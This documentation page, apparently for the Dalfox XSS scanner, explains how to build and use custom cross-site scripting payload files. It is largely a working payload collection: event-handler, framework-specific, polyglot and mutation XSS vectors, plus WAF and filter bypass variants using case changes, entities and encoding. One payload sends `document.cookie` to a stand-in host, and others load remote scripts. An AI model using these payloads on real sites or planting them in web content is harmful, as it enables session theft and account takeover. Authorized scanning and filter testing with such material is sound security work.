+++
title = "Custom Payloads"
description = "Learn how to create and use custom XSS payloads with Dalfox"
weight = 5
sort_by = "weight"

[extra]
+++

Learn how to create, manage, and use custom XSS payloads with Dalfox to bypass filters, target specific contexts, and improve detection rates.

## Why Custom Payloads?

Custom payloads are essential when:

- Built-in payloads don't bypass WAF/filters
- Testing specific JavaScript frameworks
- Targeting niche injection contexts
- Researching new XSS techniques
- Tailoring payloads to application behavior

## Basic Custom Payload Usage

### Creating a Payload File

Create a text file with one payload per line:

**my-payloads.txt:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Using Custom Payloads

```bash
dalfox scan https://example.com --custom-payload my-payloads.txt
```

This adds your payloads to the built-in payload set.

### Using Only Custom Payloads

```bash
dalfox scan https://example.com \
  --custom-payload my-payloads.txt \
  --only-custom-payload
```

This skips all built-in payloads and uses only yours.

## Payload Types

### 1. Basic Event Handlers

```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### 2. Script Tags

```html
<script>alert(1)</script>
<script src=//xss.com></script>
<script>fetch('//xss.com?c='+document.cookie)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### 3. JavaScript Protocol

```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">
<object data="javascript:alert(1)">
```

### 4. Data URIs

```html
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

### 5. DOM-Based Payloads

```html
<img src=x onerror="eval(location.hash.substr(1))">
<svg onload="eval(atob(location.hash.substr(1)))">
<body onhashchange="eval(location.hash.substr(1))">
```

### 6. Framework-Specific

**Angular.js:**
```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
<div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>
```

**Vue.js:**
```html
<div v-html="'<img src=x onerror=alert(1)>'"></div>
{{_c.constructor('alert(1)')()}}
```

**React:**
```html
<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}/>
```

## WAF/Filter Bypass Techniques

### 1. Case Variation

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
```

### 2. HTML Entities

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### 3. JavaScript Encoding

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval('\x61\x6c\x65\x72\x74(1)')</script>
```

### 4. Null Bytes and Special Characters

```html
<script>al%00ert(1)</script>
<img src=x onerror="a\u{6c}ert(1)">
<svg onload="ale\x72t(1)">
```

### 5. Comment Breaking

```html
<!--><script>alert(1)</script>
<script><!--
alert(1)
--></script>
```

### 6. Attribute Breaking

```html
"><script>alert(1)</script>
'><script>alert(1)</script>
" onload="alert(1)
' onload='alert(1)
```

## Context-Specific Payloads

### HTML Context

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### Attribute Context

```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" onclick="alert(1)
' onclick='alert(1)
```

### JavaScript String Context

```javascript
';alert(1);//
';alert(1);'
";alert(1);"
\';alert(1);//
```

### JavaScript Comment Context

```javascript
*/alert(1);//
*/alert(1);/*
```

### CSS Context

```html
</style><script>alert(1)</script>
<style>@import'javascript:alert(1)';</style>
```

## Advanced Payload Techniques

### 1. Polyglot Payloads

Works in multiple contexts:

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### 2. Mutation XSS (mXSS)

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style>
```

### 3. DOM Clobbering

```html
<form name=x><input id=y></form>
<img name=x id=y>
```

### 4. RPO (Relative Path Overwrite)

```html
<link rel=stylesheet href=style.css>
<script>alert(1)</script>
```

## Building Payload Collections

### Organizing Payloads by Purpose

**waf-bypass.txt** - WAF evasion payloads
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x id=_ alt=al ` ;x=document.location.hash.substr(1);eval(x)// onerror=eval(alt+`e`+id+`(`+alt+id+`)`)>
```

**framework-specific.txt** - Framework payloads
```html
{{constructor.constructor('alert(1)')()}}
<div v-html="'<img src=x onerror=alert(1)>'"></div>
```

**short-payloads.txt** - Length-restricted contexts
```html
<script src=//⑮.₨></script>
<svg onload=alert(1)>
<img src onerror=alert(1)>
```

### Using Multiple Payload Files

```bash
# Test with all collections
cat waf-bypass.txt framework-specific.txt short-payloads.txt > all-payloads.txt

dalfox scan https://example.com \
  --custom-payload all-payloads.txt \
  --only-custom-payload
```

## Fetching Remote Payloads

### Built-in Remote Sources

```bash
# PortSwigger XSS Cheat Sheet
dalfox scan https://example.com --remote-payloads portswigger

# PayloadBox collection
dalfox scan https://example.com --remote-payloads payloadbox

# Both
dalfox scan https://example.com --remote-payloads portswigger,payloadbox
```

### Combining Remote and Custom

```bash
dalfox scan https://example.com \
  --remote-payloads portswigger,payloadbox \
  --custom-payload my-special-payloads.txt
```

## Payload Engineering

### 1. Start Simple

```bash
# Test basic payloads first
echo '<script>alert(1)</script>' > test.txt
dalfox scan https://example.com --custom-payload test.txt
```

### 2. Analyze Filters

If basic payloads fail:
1. Check what gets reflected
2. Identify filtering patterns
3. Craft bypass payloads

### 3. Iterate and Refine

```bash
# Round 1: Basic
<script>alert(1)</script>

# Round 2: Case variation
<ScRiPt>alert(1)</ScRiPt>

# Round 3: Encoding
<script>&#97;&#108;&#101;&#114;&#116;(1)</script>

# Round 4: Alternative vectors
<img src=x onerror=alert(1)>
```

## Using Dalfox Payload Command

### Explore Built-in Payloads

```bash
# List event handlers
dalfox payload event-handlers > handlers.txt

# List useful tags
dalfox payload useful-tags > tags.txt

# Combine them
for tag in $(cat tags.txt); do
  for handler in $(head -20 handlers.txt); do
    echo "<$tag $handler=alert(1)>"
  done
done > generated-payloads.txt

# Test generated payloads
dalfox scan https://example.com --custom-payload generated-payloads.txt
```

## Practical Examples

### Example 1: Bypass Length Restriction

Target only accepts 30 characters:

**short.txt:**
```html
<svg/onload=alert(1)>
<script src=//x.cm>
<img src onerror=\u{61}lert(1)>
```

```bash
dalfox scan https://example.com --custom-payload short.txt
```

### Example 2: Bypass Script Tag Filter

Application blocks `<script>`:

**no-script.txt:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
```

```bash
dalfox scan https://example.com \
  --custom-payload no-script.txt \
  --only-custom-payload
```

### Example 3: Angular Application

**angular.txt:**
```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
<div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>
{{toString().constructor.prototype.toString=toString().constructor.prototype.call;["a","alert(1)"].sort(toString().constructor);}}
```

```bash
dalfox scan https://angular-app.example.com \
  --custom-payload angular.txt
```

### Example 4: Comprehensive Test

```bash
dalfox scan https://example.com \
  --remote-payloads portswigger,payloadbox \
  --custom-payload waf-bypass.txt \
  --custom-payload framework-specific.txt \
  -e url,html,base64 \
  -W params.txt \
  --remote-wordlists burp,assetnote \
  -f json \
  -o comprehensive-test.json
```

## Payload Verification

### Manual Testing

After Dalfox finds a vulnerability with custom payload:

1. Copy the successful payload
2. Test manually in browser
3. Verify execution
4. Test in different browsers
5. Document the working payload

### Automated Verification

```bash
#!/bin/bash

PAYLOAD_FILE="test-payloads.txt"
TARGET="https://example.com?q="

while read payload; do
  echo "Testing: $payload"
  
  # URL encode payload
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  
  # Test with curl
  RESPONSE=$(curl -s "${TARGET}${ENCODED}")
  
  # Check if payload appears in response
  if echo "$RESPONSE" | grep -q "$payload"; then
    echo "✓ Reflected: $payload"
  fi
done < "$PAYLOAD_FILE"
```

## Best Practices

{% collapse(title="1. Organize Payloads") %}
Keep payloads organized by:
- Purpose (bypass, detection, PoC)
- Context (HTML, JS, attribute)
- Framework (Angular, React, Vue)
- Length (short, medium, long)
{% end %}

{% collapse(title="2. Document Sources") %}
Add comments to your payload files:
```
# Source: PortSwigger XSS Cheat Sheet
<script>alert(1)</script>

# Custom bypass for CloudFlare WAF
<scr<script>ipt>alert(1)</scr</script>ipt>
```
{% end %}

{% collapse(title="3. Version Control") %}
Keep payload files in version control:
```bash
git init payloads
cd payloads
echo '<script>alert(1)</script>' > basic.txt
git add .
git commit -m "Add basic XSS payloads"
```
{% end %}

{% collapse(title="4. Test Incrementally") %}
Start with simple payloads, add complexity:
1. Basic payloads
2. Add encoding
3. Add obfuscation
4. Add framework-specific
{% end %}

## Payload Resources

### Online Collections

- **PortSwigger XSS Cheat Sheet**: Comprehensive payload database
- **PayloadBox**: Curated XSS payload collection
- **OWASP XSS Filter Evasion**: Classic evasion techniques
- **PayloadsAllTheThings**: Community-maintained repo

### Generating Payloads

```bash
# Clone PayloadsAllTheThings
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings/XSS\ Injection

# Extract XSS payloads
cat README.md | grep -E '<script>|<img|<svg' > xss-payloads.txt

# Use with Dalfox
dalfox scan https://example.com --custom-payload xss-payloads.txt
```

## See Also

- [Basic XSS Scanning](/usage_guides/basic_xss_scanning) - Getting started
- [Payload Command](/sub-commands/payload) - Payload enumeration
- [Scan Command](/sub-commands/scan) - Complete scanning reference
